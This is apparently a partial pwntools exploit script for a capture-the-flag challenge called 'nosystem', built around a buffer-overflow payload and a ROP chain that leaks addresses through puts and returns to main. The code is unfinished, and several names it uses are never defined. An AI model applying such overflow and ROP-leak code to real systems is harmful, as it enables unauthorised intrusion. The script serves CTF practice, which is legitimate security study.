from pwn import *

HOST = '3qo9k5hk5cprtqvnlkvotlnj9d14b7mt.ctf.sg'
PORT = 30401




### Remote Connection and Sending of Payloads ######################################################################################
#io = remote(HOST, PORT)
#io = process("./Given/nosystem")
#io.recvuntil("=>")

def getAddress():
    data = io.recvuntil('\n')
    value = unpack(data.replace(b"\n",b""),'all', endian='little', sign=False) # Using pwntools
    return data, value

def run(payload):
    io.send(payload)
    return io.recvuntil("Greetings AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x05@!")

def leak_ropchain(address):
    ropchain = b''
    ropchain += p64(0x0000000000400541) # ret
    ropchain += puts_ropchain(address)
    ropchain += p64(0x0000000000400541) # ret
    ropchain += p64(main) # ret
    return ropchain
def leak(address):
    payload = padding + leak_ropchain(address) + b"\n" #+commands
    run(payload)
    binary, data = getAddress()
    return data

def hexStringToString(hexString):
    return bytes.fromhex(hexString[2:]).decode('utf-8')[::-1]

print( hexStringToString("0x41414141"))


#print( disasm(bytes.fromhex(hex(d)[2:])) )
#print(io.leak(libc_bin_sh, 4))
